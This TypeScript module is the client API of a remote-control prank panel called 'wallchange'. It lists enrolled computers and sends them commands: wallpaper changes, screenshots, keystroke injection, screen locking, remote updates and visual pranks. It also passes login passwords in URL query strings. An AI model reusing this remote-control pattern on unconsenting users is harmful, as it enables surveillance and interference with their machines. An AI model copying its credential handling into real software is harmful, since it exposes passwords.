export const BASE_URL = "https://wallchange.codeky.fr";

export interface Client {
  id: string;
  hostname?: string;
  os?: string;
  uptime?: string;
  cpu?: string;
  ram?: string;
  version?: string;
}

export interface LoginResponse {
  status: string;
  token: string;
  type: string;
}

let authToken: string | null = localStorage.getItem('wallchange_token');
let userRole: string | null = localStorage.getItem('wallchange_role');

const getHeaders = () => {
  const headers: HeadersInit = {};
  if (authToken) {
    headers['Authorization'] = `Bearer ${authToken}`;
  }
  return headers;
};

const handleResponse = async (response: Response) => {
  if (response.status === 401) {
    authToken = null;
    userRole = null;
    localStorage.removeItem('wallchange_token');
    localStorage.removeItem('wallchange_role');
    window.location.reload();
    throw new Error("Unauthorized");
  }
  if (response.status === 429) throw new Error("Rate limit: Please wait 10s");
  if (!response.ok) throw new Error(await response.text());
  return response;
};

export const api = {
  setAuth: (token: string, type: string) => {
    authToken = token;
    userRole = type;
    localStorage.setItem('wallchange_token', token);
    localStorage.setItem('wallchange_role', type);
  },

  getToken: () => authToken,
  isAdmin: () => userRole === 'admin',

  logout: () => {
    authToken = null;
    userRole = null;
    localStorage.removeItem('wallchange_token');
    localStorage.removeItem('wallchange_role');
  },

  login: async (user: string, pass: string): Promise<LoginResponse> => {
    const response = await fetch(`${BASE_URL}/api/login?user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`);
    if (!response.ok) throw new Error('Login failed');
    const data = await response.json();
    if (data.token) {
        api.setAuth(data.token, data.type);
    }
    return data;
  },

  getVersion: async (): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/version`);
    return response.text();
  },

  listClients: async (): Promise<Client[]> => {
    const response = await fetch(`${BASE_URL}/api/list`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.json();
  },

  changeWallpaper: async (id: string, url: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/send?id=${id}&url=${encodeURIComponent(url)}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  drunk: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/drunk?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  uploadWallpaper: async (id: string | undefined, file: File): Promise<string> => {
    const formData = new FormData();
    formData.append("file", file);
    const query = id ? `?id=${id}` : "";
    const response = await fetch(`${BASE_URL}/api/upload${query}`, {
      method: "POST",
      headers: getHeaders(),
      body: formData,
    });
    await handleResponse(response);
    return response.text();
  },

  uploadMarquee: async (id: string, file: File): Promise<string> => {
    const formData = new FormData();
    formData.append("file", file);
    const response = await fetch(`${BASE_URL}/api/upload?id=${id}&type=marquee`, {
      method: "POST",
      headers: getHeaders(),
      body: formData,
    });
    await handleResponse(response);
    return response.text();
  },

  uploadFile: async (file: File): Promise<string> => {
    const formData = new FormData();
    formData.append("file", file);
    const response = await fetch(`${BASE_URL}/api/upload`, {
      method: "POST",
      headers: getHeaders(),
      body: formData,
    });
    await handleResponse(response);
    return response.text();
  },

  triggerUpdate: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/update?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  executeKey: async (id: string, combo: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/key?id=${id}&combo=${encodeURIComponent(combo)}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  requestScreenshot: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/screenshot?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  uninstallClient: async (id: string, from: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/uninstall?id=${id}&from=${from}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  reverseScreen: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/reverse?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  showDesktop: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/showdesktop?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  marquee: async (id: string, url: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/marquee?id=${id}&url=${encodeURIComponent(url)}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  particles: async (id: string, url: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/particles?id=${id}&url=${encodeURIComponent(url)}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  clones: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/clones?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  faketerminal: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/faketerminal?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  confetti: async (id: string, url?: string): Promise<string> => {
    const query = url ? `&url=${encodeURIComponent(url)}` : "";
    const response = await fetch(`${BASE_URL}/api/confetti?id=${id}${query}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  spotlight: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/spotlight?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  textscreen: async (id: string, text?: string): Promise<string> => {
    const query = text ? `&text=${encodeURIComponent(text)}` : "";
    const response = await fetch(`${BASE_URL}/api/textscreen?id=${id}${query}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  wavescreen: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/wavescreen?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  dvdbounce: async (id: string, url?: string): Promise<string> => {
    const query = url ? `&url=${encodeURIComponent(url)}` : "";
    const response = await fetch(`${BASE_URL}/api/dvdbounce?id=${id}${query}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  fireworks: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/fireworks?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  uploadParticles: async (id: string, file: File): Promise<string> => {
    const formData = new FormData();
    formData.append("file", file);
    const response = await fetch(`${BASE_URL}/api/upload?id=${id}&type=particles`, {
      method: "POST",
      headers: getHeaders(),
      body: formData,
    });
    await handleResponse(response);
    return response.text();
  },

  lock: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/lock?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },
};
